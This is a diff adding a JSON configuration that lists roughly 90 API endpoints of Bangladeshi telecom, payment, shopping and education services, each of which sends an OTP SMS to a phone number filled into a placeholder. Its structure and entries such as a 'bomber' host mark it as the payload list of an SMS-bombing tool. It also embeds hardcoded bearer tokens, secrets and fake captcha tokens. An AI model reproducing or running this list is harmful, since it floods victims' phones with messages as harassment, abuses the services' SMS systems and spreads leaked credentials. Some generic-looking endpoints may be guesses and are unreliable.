@@ -1,0 +1,630 @@
+{
+  "apis": [
+    {
+      "url": "https://app.eonbazar.com/api/auth/login",
+      "method": "POST",
+      "body": { "method": "otp", "mobile": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.osudpotro.com/api/v1/users/send_otp",
+      "method": "POST",
+      "body": { "os": "web", "mobile": "+88-{{number}}", "language": "en", "deviceToken": "web" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api3.bioscopelive.com/auth/api/v2/login/send-otp",
+      "method": "POST",
+      "body": {
+        "msisdn": "88{{number}}",
+        "token_type": "CUSTOM_TOKEN_V1",
+        "operator": "all",
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJleHAiOjE2ODYyMjM3NTUuMH0.b1AE7E8tL0TmnqW1ivCoLB87A6FDl4Yhi1BCBuKjBhvzbjbeigjYUWiu-JbCGeI-gK3A7A62oIejfYroKfmALQ"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "http://bomber.ezyro.com/index.php?number={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api.redx.com.bd/v1/user/signup",
+      "method": "POST",
+      "body": { "name": "user", "phoneNumber": "{{number}}", "service": "redx" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "http://206.189.134.221/wordpress/wp-content/uploads/bmb/{{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://cokestudio23.sslwireless.com/api/store-and-send-otp",
+      "method": "POST",
+      "body": {
+        "msisdn": "88{{number}}",
+        "name": "User",
+        "email": "user@mail.com",
+        "dob": "2000-01-01",
+        "occupation": "N/A",
+        "gender": "male"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://cokestudio23.sslwireless.com/api/check-gp-number",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
+      "method": "POST",
+      "body": { "mobile": "+880{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.swap.com.bd/api/v1/send-otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.bd.airtel.com/v1/account/login/otp",
+      "method": "POST",
+      "body": { "phone_number": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.bd.airtel.com/v1/account/register/otp",
+      "method": "POST",
+      "body": { "phone_number": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://www.rokomari.com/otp/send?emailOrPhone=88{{number}}&countryCode=BD",
+      "method": "GET"
+    },
+    {
+      "url": "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://m.cricbuzz.com/cbplus/auth/user/signup",
+      "method": "POST",
+      "body": { "username": "user{{number}}@mail.com" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.paragonfood.com.bd/auth/customerlogin",
+      "method": "POST",
+      "body": { "emailOrPhone": "user{{number}}@mail.com" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://prod-api.viewlift.com/identity/signup?site=prothomalo",
+      "method": "POST",
+      "body": { "requestType": "send", "phoneNumber": "+880{{number}}", "emailConsent": true, "whatsappConsent": false },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
+      "method": "POST",
+      "body": { "requestType": "send", "phoneNumber": "+880{{number}}", "emailConsent": true, "whatsappConsent": true },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
+      "method": "POST",
+      "body": {
+        "full_name": "User",
+        "company_name": "Company",
+        "email_address": "user{{number}}@mail.com",
+        "phone_number": "{{number}}"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://app.eonbazar.com/api/auth/register",
+      "method": "POST",
+      "body": { "mobile": "{{number}}", "name": "User", "password": "pass123", "email": "user{{number}}@mail.com" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://tracking.sundarbancourierltd.com/PreBooking/SendPin",
+      "method": "POST",
+      "body": { "PreBookingRegistrationPhoneNumber": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername",
+      "method": "POST",
+      "body": { "PreBookingRegistrationUsername": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://ultranetrn.com.br/fonts/api.php?number={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
+      "method": "POST",
+      "body": { "mobile_no": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",
+      "method": "POST",
+      "body": {
+        "data": {
+          "country_calling_code": "88",
+          "contact_no": "{{number}}",
+          "headers": { "PlatForm": "Web" }
+        }
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api-gateway.sundarbancourierltd.com/graphql",
+      "method": "POST",
+      "body": {
+        "operationName": "CreateAccessToken",
+        "variables": { "accessTokenFilter": { "userName": "{{number}}" } },
+        "query": "mutation{createAccessToken(accessTokenFilter:{userName:\"{{number}}\"}){message}}"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.apex4u.com/api/auth/login",
+      "method": "POST",
+      "body": { "phoneNumber": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://webapi.robi.com.bd/v1/send-otp",
+      "method": "POST",
+      "body": { "phone_number": "{{number}}", "type": "doorstep" },
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc"
+      }
+    },
+    {
+      "url": "https://web-api.banglalink.net/api/v1/user/number/validation/{{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request",
+      "method": "POST",
+      "body": { "mobile": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" }
+    },
+    {
+      "url": "https://da-api.robi.com.bd/da-nll/otp/send",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://webapi.robi.com.bd/v1/chat/send-otp",
+      "method": "POST",
+      "body": { "phone_number": "{{number}}", "name": "User", "type": "video-chat" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
+      "method": "POST",
+      "body": { "phoneNumber": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.motionview.com.bd/api/send-otp-phone-signup",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web",
+      "method": "POST",
+      "body": { "number": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://user-api.jslglobal.co:444/v2/send-otp",
+      "method": "POST",
+      "body": { "phone": "+88{{number}}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://chinaonlinebd.com/api/login/getOtp?phone={{number}}",
+      "method": "GET",
+      "headers": { "token": "45601f3d391886fcec5f5a3f26780f21" }
+    },
+    {
+      "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web",
+      "method": "POST",
+      "body": { "number": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.shikho.com/auth/v2/send/sms",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "type": "student", "auth_type": "signup" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://www.bioscopelive.com/en/login/send-otp?phone=88{{number}}&operator=bd-otp",
+      "method": "GET"
+    },
+    {
+      "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
+      "method": "POST",
+      "body": { "msisdn": "88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://chokrojan.com/api/v1/passenger/login/mobile",
+      "method": "POST",
+      "body": { "mobile_number": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://core.easy.com.bd/api/v1/forgot-password-otp",
+      "method": "POST",
+      "body": { "device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://waltonplaza.com.bd/api/auth/otp/create",
+      "method": "POST",
+      "body": {
+        "auth": {
+          "countryCode": "880",
+          "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg",
+          "phone": "{{number}}"
+        },
+        "captchaToken": "recapcha"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.chardike.com/api/otp/send",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "otp_type": "login" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
+      "method": "POST",
+      "body": { "phoneNbr": "{{number}}", "OTPType": 1, "userName": "", "email": "" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://gateway.otithee.com/api/v1/generate-otp",
+      "method": "POST",
+      "body": { "request_type": "registration", "mobile_number": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+      "method": "POST",
+      "body": { "country_code": "+88", "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://new.mojaru.com/api/student/login",
+      "method": "POST",
+      "body": { "mobile_or_email": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
+      "method": "POST",
+      "body": { "mobileNumber": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.garibookadmin.com/api/v3/user/login",
+      "method": "POST",
+      "body": { "recaptcha_token": "garibookcaptcha", "mobile": "{{number}}", "channel": "web" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web",
+      "method": "POST",
+      "body": { "number": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
+      "method": "POST",
+      "body": {
+        "wallet_number": "{{number}}",
+        "geo_location": { "lat": 23.89, "long": 89.13 },
+        "referral": "",
+        "firebase_token": "dummy",
+        "device_uuid": "c65m117a8cbf5b1851b29f8b",
+        "mno": "Robi"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://bb-api.bohubrihi.com/public/activity/otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "intent": "login" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://backend.timezonebd.com/api/v1/user/otp-login",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "language": "en", "email": "" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.shikho.com/public/activity/otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "intent": "ap-discount-request" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://edgecoursebd.com/register",
+      "method": "POST",
+      "body": [{ "phone": "{{number}}" }],
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.ostad.app/api/v2/user/with-otp",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://www.ieducationbd.com/api/account/check_user",
+      "method": "POST",
+      "body": { "mobile": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://app.hishabee.business/api/V2/otp/send?mobile_number={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://rootsedulive.com/api/auth/register",
+      "method": "POST",
+      "body": {
+        "name": "User",
+        "phone": "88{{number}}",
+        "email": "user{{number}}@mail.com",
+        "password": "Secure@2025",
+        "confirmPassword": "Secure@2025"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://rootsedulive.com/api/auth/forget-password",
+      "method": "POST",
+      "body": { "phoneOrEmail": "88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://mithaibd.com/api/login/",
+      "method": "POST",
+      "body": {
+        "company_id": "2",
+        "phone": "{{number}}",
+        "email": "user{{number}}@mail.com",
+        "password1": "pass123",
+        "otp_verify": false
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.englishmojabd.com/api/v1/auth/login",
+      "method": "POST",
+      "body": { "phone": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{{number}}/",
+      "method": "GET"
+    },
+    {
+      "url": "https://auth.qcoom.com/api/v1/otp/send",
+      "method": "POST",
+      "body": { "mobileNumber": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://reseller.circle.com.bd/api/v2/auth/signup",
+      "method": "POST",
+      "body": {
+        "name": "+88{{number}}",
+        "email_or_phone": "+88{{number}}",
+        "password": "123456",
+        "password_confirmation": "123456",
+        "register_by": "phone"
+      },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
+      }
+    },
+    {
+      "url": "https://api.toybox.live/bdapps_handler.php",
+      "method": "POST",
+      "body": {
+        "Operation": "CreateSubscription",
+        "MobileNumber": "88{{number}}",
+        "PackageID": 100,
+        "Secret": "HJKX71%UHYH"
+      },
+      "headers": { "Content-Type": "application/x-www-form-urlencoded" }
+    },
+    {
+      "url": "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{{number}}",
+      "method": "GET",
+      "headers": { "sourcePlatform": "web", "client": "2" }
+    },
+    {
+      "url": "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp",
+      "method": "POST",
+      "body": { "deviceId": "prodevice", "operator": "Gp", "walletNumber": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.dmoney.com.bd/api/v1/otp/send?msisdn={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api.nagad.com.bd/otp/send",
+      "method": "POST",
+      "body": { "mobileNumber": "{{number}}", "service": "login" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.surecash.com.bd/v2/otp/generate",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.rocket.com.bd/merchant/otp",
+      "method": "POST",
+      "body": { "account": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.bkash.com.bd/otp/request",
+      "method": "POST",
+      "body": { "phone": "{{number}}", "type": "registration" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.foodpanda.com.bd/v1/auth/otp",
+      "method": "POST",
+      "body": { "phone": "+88{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.pathao.com/v2/auth/otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.daraz.com.bd/auth/otp",
+      "method": "POST",
+      "body": { "mobile": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.priyoshop.com/v1/otp/send",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://ajkerdeal.com/api/v1/otp?phone={{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://api.evaly.com.bd/auth/otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.chaldal.com/v1/auth/otp",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://api.shurjopay.com.bd/otp/send",
+      "method": "POST",
+      "body": { "phone": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://sslwireless.com/api/otp",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{{number}}",
+      "method": "GET"
+    },
+    {
+      "url": "https://selfcare.banglalink.net/api/v1/otp",
+      "method": "POST",
+      "body": { "msisdn": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    },
+    {
+      "url": "https://teletalk.com.bd/api/otp/send",
+      "method": "POST",
+      "body": { "number": "{{number}}" },
+      "headers": { "Content-Type": "application/json" }
+    }
+  ],
+  "placeholders": {
+    "number": "11-digit local phone number (e.g., 017XXXXXXXX)",
+    "methods": ["GET", "POST"],
+    "content_types": ["application/json", "application/x-www-form-urlencoded"]
+  },
+  "meta": {
+    "total_apis": 90,
+    "format": "json",
+    "version": "1.0"
+  }
+}
